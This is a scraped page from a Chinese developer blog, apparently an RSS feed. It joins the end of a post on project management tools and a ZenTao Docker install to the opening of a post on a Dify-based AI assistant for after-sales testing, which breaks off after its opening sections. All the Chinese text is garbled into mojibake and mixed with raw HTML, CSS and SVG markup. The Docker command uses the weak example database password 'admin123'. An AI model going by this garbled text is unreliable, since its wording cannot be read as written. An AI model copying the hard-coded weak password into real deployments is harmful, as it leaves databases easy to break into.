<p>é¡¹ç›®æ”¶å°¾ï¼š</p>
<ol>
<li>å®Œæˆæ‰€æœ‰å‰©ä½™å·¥ä½œï¼Œç¡®ä¿è½¯ä»¶æ»¡è¶³æ‰€æœ‰è¦æ±‚ã€‚</li>
<li>è¿›è¡Œé¡¹ç›®å›é¡¾ï¼Œæ€»ç»“ç»éªŒæ•™è®­ï¼Œä»¥ä¾¿åœ¨æœªæ¥çš„é¡¹ç›®ä¸­åŠ ä»¥æ”¹è¿›ã€‚</li>
<li>å°†é¡¹ç›®æˆæœäº¤ä»˜ç»™å®¢æˆ·ï¼Œå¹¶ç¡®ä¿ä»–ä»¬æ»¡æ„ã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-1">é¡¹ç›®ç®¡ç†å¸¸è§çš„å·¥å…·</h3>
<ul>
<li>ç¦…é“ï¼šä¸€æ¬¾åŠŸèƒ½å…¨é¢ã€æ˜“äºä¸Šæ‰‹çš„å›½äº§é¡¹ç›®ç®¡ç†è½¯ä»¶ï¼Œç‰¹åˆ«é€‚åˆä¸­å°å›¢é˜Ÿè¿›è¡Œæ•æ·å¼€å‘å’Œé¡¹ç›®ç®¡ç†ã€‚</li>
<li>PingCodeï¼šç ”å‘å…¨ç”Ÿå‘½å‘¨æœŸè¦†ç›–çš„é¡¹ç›®ç®¡ç†ç³»ç»Ÿï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œé€‚ç”¨äºå„ç§è§„æ¨¡çš„ç ”å‘å›¢é˜Ÿã€‚</li>
<li>Worktileï¼šå¸‚åœºå æœ‰ç‡é«˜çš„é¡¹ç›®ç®¡ç†å·¥å…·ï¼Œè‡ªå®šä¹‰èƒ½åŠ›å¼ºï¼Œæ»¡è¶³å¤šç§é¡¹ç›®ç®¡ç†éœ€æ±‚ã€‚</li>
<li>Redmineï¼šå¼€æºçš„é¡¹ç›®ç®¡ç†è½¯ä»¶ï¼Œé›†æˆç¼ºé™·è·Ÿè¸ªï¼Œæ”¯æŒå¤šé¡¹ç›®å’Œå­é¡¹ç›®ç®¡ç†ã€‚</li>
<li>Jiraï¼šå…¨çƒçŸ¥åçš„ITé¡¹ç›®ç®¡ç†è½¯ä»¶ï¼Œå¹¿æ³›åº”ç”¨äºç¼ºé™·è·Ÿè¸ªã€ä»»åŠ¡è·Ÿè¸ªå’Œæ•æ·ç®¡ç†ã€‚</li>
</ul>
<h3 data-id="heading-2">ç¦…é“å®‰è£…</h3>
<p>ç¦…é“æ˜¯ä¸€æ¬¾å›½äº§çš„å¼€æº<strong>é¡¹ç›®ç®¡ç†è½¯ä»¶</strong>ï¼Œå®ƒä¸“æ³¨äºé¡¹ç›®ç®¡ç†ï¼Œå†…ç½®äº†å¤šç§æ ¸å¿ƒåŠŸèƒ½ï¼Œæ—¨åœ¨å¸®åŠ©é¡¹ç›®å›¢é˜Ÿæˆå‘˜é«˜æ•ˆåœ°è¿›è¡Œé¡¹ç›®è§„åˆ’ã€ä»»åŠ¡è¿½è¸ªã€è´¨é‡ç®¡ç†ã€æ–‡æ¡£ç®¡ç†ç­‰ã€‚</p>
<p><strong>æ ¸å¿ƒåŠŸèƒ½ï¼š</strong></p>
<ul>
<li>äº§å“ç®¡ç†ï¼šåŒ…æ‹¬éœ€æ±‚ã€è®¡åˆ’ã€å‘å¸ƒã€è·¯çº¿å›¾ç­‰åŠŸèƒ½ï¼Œå¸®åŠ©äº§å“ç»ç†æ•´ç†å’Œç®¡ç†äº§å“éœ€æ±‚ï¼Œåˆ¶å®šäº§å“è§„åˆ’ã€‚</li>
<li>é¡¹ç›®ç®¡ç†ï¼šæä¾›ä»»åŠ¡åˆ†é…ã€å›¢é˜Ÿåä½œã€è¿›åº¦è·Ÿè¸ªï¼ˆå¦‚ç‡ƒå°½å›¾ï¼‰ã€é¡¹ç›®é‡Œç¨‹ç¢‘è®¾ç½®ç­‰åŠŸèƒ½ï¼Œç¡®ä¿é¡¹ç›®æŒ‰è®¡åˆ’æ¨è¿›ã€‚</li>
<li>è´¨é‡ç®¡ç†ï¼šé›†æˆç¼ºé™·ç®¡ç†ã€æµ‹è¯•ç”¨ä¾‹ç®¡ç†å’Œæµ‹è¯•ä»»åŠ¡ç®¡ç†ï¼Œæ”¯æŒæµ‹è¯•äººå‘˜è®°å½•å’Œè·Ÿè¸ªé—®é¢˜ï¼Œç¡®ä¿äº§å“è´¨é‡ã€‚</li>
<li>æ–‡æ¡£ç®¡ç†ï¼šæ–¹ä¾¿åœ°è·Ÿè¸ªäº§å“å’Œé¡¹ç›®è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ–‡æ¡£ï¼Œæ”¯æŒæ–‡æ¡£åº“çš„å»ºè®¾å’Œå…±äº«ã€‚</li>
<li>äº‹åŠ¡ç®¡ç†ï¼šåŒ…æ‹¬ä¸ªäººäº‹åŠ¡ç®¡ç†åŠŸèƒ½ï¼Œå¦‚TODOåˆ—è¡¨ã€<strong>æˆ‘çš„ä»»åŠ¡</strong>ã€<strong>æˆ‘çš„Bug</strong>ç­‰ï¼Œå¸®åŠ©å›¢é˜Ÿæˆå‘˜ç®¡ç†ä¸ªäººå·¥ä½œã€‚</li>
<li>ç»„ç»‡ç®¡ç†ï¼šæ”¯æŒéƒ¨é—¨ã€ç”¨æˆ·ã€åˆ†ç»„ã€æƒé™ç­‰ç®¡ç†ï¼Œç¡®ä¿é¡¹ç›®å›¢é˜Ÿçš„ç»„ç»‡æ¶æ„æ¸…æ™°ï¼Œæƒé™åˆ†é…åˆç†ã€‚</li>
<li>ç»Ÿè®¡ä¸æœç´¢ï¼šæä¾›ä¸°å¯Œçš„ç»Ÿè®¡æŠ¥è¡¨å’Œå¼ºå¤§çš„æœç´¢åŠŸèƒ½ï¼Œå¸®åŠ©é¡¹ç›®å›¢é˜Ÿå¿«é€Ÿè·å–é¡¹ç›®ä¿¡æ¯ï¼Œè¿›è¡Œæ•°æ®åˆ†æã€‚</li>
<li>æ‰©å±•ä¸é›†æˆï¼šç¦…é“æ”¯æŒçµæ´»çš„æ‰©å±•æœºåˆ¶ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚è¿›è¡ŒäºŒæ¬¡å¼€å‘ã€‚åŒæ—¶ï¼Œç¦…é“è¿˜æä¾›äº†APIæœºåˆ¶ï¼Œæ–¹ä¾¿ä¸å…¶ä»–ç³»ç»Ÿé›†æˆã€‚</li>
</ul>
<p><strong>é¡¹ç›®å›¢é˜Ÿæˆå‘˜å¦‚ä½•ä½¿ç”¨ç¦…é“</strong></p>
<ol>
<li>
<p>äº§å“ç»ç†ï¼š</p>
<ol>
<li>åœ¨ç¦…é“ä¸­åˆ›å»ºå’Œç®¡ç†äº§å“éœ€æ±‚ï¼Œåˆ¶å®šäº§å“è§„åˆ’ï¼Œå°†éœ€æ±‚è½¬åŒ–ä¸ºå…·ä½“çš„è®¡åˆ’æˆ–è¿­ä»£ä»»åŠ¡ã€‚</li>
<li>ä½¿ç”¨ç¦…é“è¿›è¡Œéœ€æ±‚è¯„å®¡ã€ä¼˜å…ˆçº§æ’åºï¼Œå¹¶ä¸é¡¹ç›®ç»ç†å’Œå¼€å‘å›¢é˜Ÿç´§å¯†åä½œï¼Œç¡®ä¿éœ€æ±‚å¾—åˆ°å‡†ç¡®ç†è§£å’Œå®ç°ã€‚</li>
</ol>
</li>
<li>
<p>é¡¹ç›®ç»ç†ï¼š</p>
<ol>
<li>åœ¨ç¦…é“ä¸­åˆ›å»ºé¡¹ç›®ï¼Œå…³è”äº§å“éœ€æ±‚ï¼Œåˆ¶å®šé¡¹ç›®è®¡åˆ’å’Œé‡Œç¨‹ç¢‘ã€‚</li>
<li>åˆ†é…ä»»åŠ¡ç»™å¼€å‘å›¢é˜Ÿï¼Œè·Ÿè¸ªé¡¹ç›®è¿›åº¦ï¼Œç¡®ä¿é¡¹ç›®æŒ‰è®¡åˆ’æ¨è¿›ã€‚</li>
<li>ç»„ç»‡é¡¹ç›®ä¼šè®®ï¼Œå¦‚æ¯æ—¥ç«™ç«‹ä¼šè®®ã€è¿­ä»£å›é¡¾ä¼šè®®ç­‰ï¼Œä¸å›¢é˜Ÿæˆå‘˜ä¿æŒç´§å¯†æ²Ÿé€šã€‚</li>
</ol>
</li>
<li>
<p>å¼€å‘äººå‘˜ï¼š</p>
<ol>
<li>åœ¨ç¦…é“ä¸­é¢†å–ä»»åŠ¡ï¼Œè®°å½•ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€ï¼Œç®¡ç†æŒ‡å‘è‡ªå·±çš„ç¼ºé™·ï¼ˆBugï¼‰çŠ¶æ€ã€‚</li>
<li>ä¸æµ‹è¯•å›¢é˜Ÿç´§å¯†åä½œï¼ŒåŠæ—¶ä¿®å¤ç¼ºé™·ï¼Œç¡®ä¿è½¯ä»¶è´¨é‡ã€‚</li>
</ol>
</li>
<li>
<p>æµ‹è¯•äººå‘˜ï¼š</p>
<ol>
<li>åœ¨ç¦…é“ä¸­åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ï¼Œæ‰§è¡Œæµ‹è¯•ä»»åŠ¡ï¼Œè®°å½•å’Œè·Ÿè¸ªç¼ºé™·ã€‚</li>
<li>ç¼–å†™æµ‹è¯•æŠ¥å‘Šï¼Œä¸ºé¡¹ç›®è´¨é‡æä¾›æ•°æ®æ”¯æŒã€‚</li>
<li>ä¸å¼€å‘å›¢é˜Ÿç´§å¯†åä½œï¼Œç¡®ä¿ç¼ºé™·å¾—åˆ°åŠæ—¶ä¿®å¤å’ŒéªŒè¯ã€‚</li>
</ol>
</li>
<li>
<p>æ–‡æ¡£ç®¡ç†å‘˜ï¼š</p>
<ol>
<li>åœ¨ç¦…é“ä¸­ç®¡ç†é¡¹ç›®æ–‡æ¡£åº“ï¼Œæ•´ç†å’Œå…±äº«é¡¹ç›®è¿‡ç¨‹ä¸­äº§ç”Ÿçš„å„ç±»æ–‡æ¡£ã€‚</li>
<li>ç¡®ä¿å›¢é˜Ÿæˆå‘˜èƒ½å¤Ÿæ–¹ä¾¿åœ°è·å–æ‰€éœ€æ–‡æ¡£ï¼Œæ”¯æŒé¡¹ç›®å·¥ä½œçš„é¡ºåˆ©è¿›è¡Œã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-3">docker å®‰è£…</h3>
<pre><code class="hljs language-cmd" lang="cmd">docker pull easysoft/zentao:12.3.3 
</code></pre>
<blockquote>
<p>åˆ›å»ºå®¹å™¨</p>
</blockquote>
<ul>
<li>--privileged -it æå‡æƒé™ï¼Œæœ‰é£é™©</li>
<li>è®¿é—®çš„ç«¯å£å·ä¸º8001</li>
<li>è¯¥å®¹å™¨ä¸­å†…ç½®äº†mysqlæ•°æ®åº“ï¼Œéœ€è¦å•ç‹¬è®¾ç½®ä¸€ä¸ªå¯†ç </li>
</ul>
<p>å¯åŠ¨å®¹å™¨æˆåŠŸåï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®ç¦…é“ï¼Œè®¿é—®åœ°å€ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fip%3A8001%25E5%258D%25B3%25E5%258F%25AF" target="_blank" title="http://ip:8001%E5%8D%B3%E5%8F%AF" ref="nofollow noopener noreferrer">http://ip:8001å³å¯</a></p>
<pre><code class="hljs language-cmd" lang="cmd">docker run -d --name zentao -p 8001:80  -v D:/docker_config/chan_dao/zentaopms:/www/zentaopms -v D:/docker_config/chan_dao/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=admin123 -d easysoft/zentao:12.3.3
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIèµ‹èƒ½å”®åæµ‹è¯•ï¼šä»â€œé»‘ç›’â€åˆ°â€œæ™ºèƒ½ä¼™ä¼´â€]]></title>    <link>https://juejin.cn/post/7603142147642736683</link>    <guid>https://juejin.cn/post/7603142147642736683</guid>    <pubDate>2026-02-05T09:35:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147642736683" data-draft-id="7602996277665333302" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIèµ‹èƒ½å”®åæµ‹è¯•ï¼šä»â€œé»‘ç›’â€åˆ°â€œæ™ºèƒ½ä¼™ä¼´â€"/> <meta itemprop="keywords" content="Cursor"/> <meta itemprop="datePublished" content="2026-02-05T09:35:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIèµ‹èƒ½å”®åæµ‹è¯•ï¼šä»â€œé»‘ç›’â€åˆ°â€œæ™ºèƒ½ä¼™ä¼´â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:35:34.000Z" title="Thu Feb 05 2026 09:35:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ä¸€ã€é¡¹ç›®æ¨è¿›ä¸åˆä½œä¸­çš„ä¸‰å¤§æ ¸å¿ƒç—›ç‚¹çš„è§£å†³</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1. é€»è¾‘ä¸é€æ˜ â†’ æ™ºèƒ½é€»è¾‘è§£æ</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2. æ•°æ®æ„é€ ç¹ç â†’ åœºæ™¯åŒ–æ„é€ æ¨è</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3. è§„åˆ™åŒæ­¥æ»å â†’ å®æ—¶è§„åˆ™æŸ¥è¯¢ä¸è§£é‡Š</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">äºŒã€AIæ™ºèƒ½åŠ©æ‰‹ï¼Œå¦‚ä½•æ”¹å˜ç°çŠ¶ï¼Ÿ</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">âœ… ä¸šåŠ¡é—®é¢˜å®æ—¶è§£ç­”</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">âœ… å¼€å‘ä¸æµ‹è¯•é«˜æ•ˆæ”¯æŒ</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">âœ… æœåŠ¡ä¸¤ç±»ç”¨æˆ·ç¾¤ä½“</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ä¸‰ã€ä¸ºä»€ä¹ˆé€‰æ‹©Difyï¼Ÿ</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">å››ã€difyæ™ºèƒ½åŠ©æ‰‹æ­å»ºå®ç°</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">äº”ã€å·²å®ç°åœºæ™¯æ¼”ç¤º</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ğŸ“Œ åœºæ™¯ä¸€ï¼šå”®åå•å®æ—¶çŠ¶æ€æŸ¥è¯¢</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ğŸ“Œ åœºæ™¯äºŒï¼šåŸºäºå•å·çš„ä¸šåŠ¡é€»è¾‘è¿½é—®</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ğŸ“Œ åœºæ™¯ä¸‰ï¼šæ•°æ®æ„é€ æŒ‡å¯¼</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ğŸ“Œ åœºæ™¯å››ï¼šæ— å•å·çº¯é€»è¾‘ç­”ç–‘</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">å…­ã€æ•ˆæœå·²ç°ï¼Œä¼˜åŒ–æŒç»­</a></p>
</li>
</ul>
<p>å”®åç³»ç»Ÿé•¿æœŸä»¥æ¥åƒæ˜¯ä¼ä¸šå†…éƒ¨çš„â€œé»‘ç›’â€â€”â€”æµç¨‹å¤æ‚ã€ä¿¡æ¯åˆ†æ•£ã€é€»è¾‘äº¤å‰ï¼Œä¸šåŠ¡éƒ¨é—¨åœ¨é¡¹ç›®æ¨è¿›ä¸­å¸¸é¢ä¸´ä¸‰é‡é˜»åŠ›ï¼š</p>
<p><strong>é€»è¾‘ç†è§£éš¾</strong>ï¼šä¸åŒå”®ååœºæ™¯å‘½ä¸­æ¡ä»¶é”™ç»¼å¤æ‚ï¼Œäººå·¥æ’æŸ¥æ•ˆç‡ä½ä¸‹ï¼›</p>
<p><strong>æ•°æ®æ„é€ ç¹</strong>ï¼šæµ‹è¯•éªŒè¯æ—¶ç¼ºä¹æ ‡å‡†æ„é€ æŒ‡å¼•ï¼Œä¾èµ–ç»éªŒè¯•é”™ï¼Œå‘¨æœŸå†—é•¿ï¼›</p>
<p><strong>è§„åˆ™å“åº”æ…¢</strong>ï¼šè·¨éƒ¨é—¨åä½œä¸­ï¼Œè§„åˆ™è§£é‡Šä¾èµ–äººå·¥æ²Ÿé€šï¼Œä¿¡æ¯åŒæ­¥ä¸åŠæ—¶ã€‚</p>
<p>è¿™ä¸ä»…æ‹–æ…¢äº†é¡¹ç›®èŠ‚å¥ï¼Œæ›´è®©å†…éƒ¨åä½œé™·å…¥â€œç­‰äººã€é—®äººã€æ‰¾äººâ€çš„å¾ªç¯ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬æ¨å‡ºåŸºäºDifyå¹³å°æ„å»ºçš„<strong>å”®åä¸šåŠ¡æ™ºèƒ½åŠ©æ‰‹</strong>ï¼Œèšç„¦<strong>é€»è¾‘æ¢³ç†ã€æ•°æ®æ„é€ ã€è§„åˆ™åŒæ­¥</strong>ä¸‰å¤§åœºæ™¯ï¼Œå°†â€œé»‘ç›’â€å˜ä¸ºâ€œé€æ˜å·¥ä½œå°â€ï¼Œä¸ºé¡¹ç›®åä½œä¸æµ‹è¯•éªŒè¯æä¾›æ™ºèƒ½æ”¯æŒã€‚</p>
<h2 data-id="heading-0">ä¸€ã€é¡¹ç›®æ¨è¿›ä¸åˆä½œä¸­çš„ä¸‰å¤§æ ¸å¿ƒç—›ç‚¹çš„è§£å†³</h2>
<h3 data-id="heading-1">1. é€»è¾‘ä¸é€æ˜ â†’ æ™ºèƒ½é€»è¾‘è§£æ</h3>
<p>ç³»ç»Ÿå¯è‡ªåŠ¨è§£æä¸åŒå”®åæµç¨‹çš„å‘½ä¸­è§„åˆ™ä¸åˆ¤å®šé€»è¾‘ï¼Œä¸ºä¸šåŠ¡å†³ç­–å’Œé¡¹ç›®å¯¹é½æä¾›æ¸…æ™°ä¾æ®ã€‚</p>
<h3 data-id="heading-2">2. æ•°æ®æ„é€ ç¹ç â†’ åœºæ™¯åŒ–æ„é€ æ¨è</h3>
<p>æä¾›å¸¸è§æµ‹è¯•åœºæ™¯çš„æ ‡å‡†åŒ–æ•°æ®æ„é€ æ–¹æ¡ˆï¼Œé™„ç¤ºä¾‹å‚æ•°ä¸æ“ä½œé“¾æ¥ï¼Œæå‡æµ‹è¯•æ•ˆç‡ä¸å‡†ç¡®æ€§ã€‚</p>
<h3 data-id="heading-3">3. è§„åˆ™åŒæ­¥æ»å â†’ å®æ—¶è§„åˆ™æŸ¥è¯¢ä¸è§£é‡Š</h3>
<p>ä¸šåŠ¡è§„åˆ™ä¸æµç¨‹è¯´æ˜å®æ—¶å¯æŸ¥ï¼Œæ”¯æŒè‡ªç„¶è¯­è¨€æé—®ï¼Œå‡å°‘è·¨å›¢é˜Ÿæ²Ÿé€šæˆæœ¬ä¸ä¿¡æ¯è¯¯å·®ã€‚</p>
<h2 data-id="heading-4">äºŒã€AIæ™ºèƒ½åŠ©æ‰‹ï¼Œå¦‚ä½•æ”¹å˜ç°çŠ¶ï¼Ÿ</h2>
<h3 data-id="heading-5">âœ… ä¸šåŠ¡é—®é¢˜å®æ—¶è§£ç­”</h3>
<p>â— æ— æ³•ç”³è¯·å”®åï¼Ÿã€æä¾›ã€‘ä¸€é”®æ’æŸ¥åŸå› </p>
<p>â— æµç¨‹å‘½ä¸­é€»è¾‘ä¸æ¸…æ™°ï¼Ÿã€æä¾›ã€‘è‡ªåŠ¨è¯´æ˜è§„åˆ™</p>
<p>â— è´¨æ£€è´£ä»»è®¤å®šæ¨¡ç³Šï¼Ÿã€æä¾›ã€‘æ˜ç¡®åˆ¤å®šä¾æ®ä¸æµç¨‹é€‰æ‹©</p>
<p>â— æ•£è´§äº¤æ¥åå»å“ªè´¨æ£€ï¼Ÿã€æä¾›ã€‘æ™ºèƒ½æ¨èä»“åº“ä¸ç«™ç‚¹</p>
<h3 data-id="heading-6">âœ… å¼€å‘ä¸æµ‹è¯•é«˜æ•ˆæ”¯æŒ</h3>
<p>â— æä¾›å„ç±»è®¢å•æ„é€ æ–¹æ³•ä¸ç¤ºä¾‹</p>
<p>â— å®æ—¶æŸ¥è¯¢å”®åç±»å‹ä¸èŠ‚ç‚¹æ•°æ®</p>
<p>â— æ•°æ®æ„é€ åï¼Œè‡ªåŠ¨ç»™å‡ºä¸‹ä¸€æ­¥æ“ä½œå»ºè®®æŒ‡å‘</p>
<h3 data-id="heading-7">âœ… æœåŠ¡ä¸¤ç±»ç”¨æˆ·ç¾¤ä½“</h3>
<p>â— å†…éƒ¨å›¢é˜Ÿï¼šæå‡åä½œæ•ˆç‡ï¼Œé‡Šæ”¾äººåŠ›</p>
<p>â— ä¸šåŠ¡åˆä½œæ–¹ï¼šæä¾›æ ‡å‡†åŒ–ã€å³æ—¶åŒ–çš„è§£ç­”æ”¯æŒ</p>
<h2 data-id="heading-8">ä¸‰ã€ä¸ºä»€ä¹ˆé€‰æ‹©Difyï¼Ÿ</h2>
<p>åœ¨è¯„ä¼°å¤šç§å®ç°æ–¹æ¡ˆåï¼Œæˆ‘ä»¬æœ€ç»ˆé€‰ç”¨Difyå¹³å°ï¼Œä¸»è¦å› ä¸ºï¼š</p>
<p>â— ä½é—¨æ§›å¯è§†åŒ–æ­å»ºï¼šæ— éœ€ä»£ç å³å¯é…ç½®å·¥ä½œæµï¼Œå¿«é€Ÿè¿­ä»£</p>
<p>â— å†…ç½®AIæ ¸å¿ƒæ¨¡å—ï¼šçŸ¥è¯†åº“ã€æ„å›¾è¯†åˆ«ã€å¯¹è¯ç®¡ç†å¼€ç®±å³ç”¨</p>
<p>â— çµæ´»æ‰©å±•æ€§å¼ºï¼šæ”¯æŒè¿æ¥å¤–éƒ¨æ¥å£ï¼ˆMCPï¼‰ï¼Œè·å–å®æ—¶ä¸šåŠ¡æ•°æ®</p>
<p>â— difyå¯æä¾›æœºå™¨äººä¼šè¯å·¥ä½œæµç¨‹æ­å»º</p>
<h2 data-id="heading-9">å››ã€difyæ™ºèƒ½åŠ©æ‰‹æ­å»ºå®ç°</h2>
<p>æ•´ä½“è®¾è®¡æ€è·¯ï¼š</p>
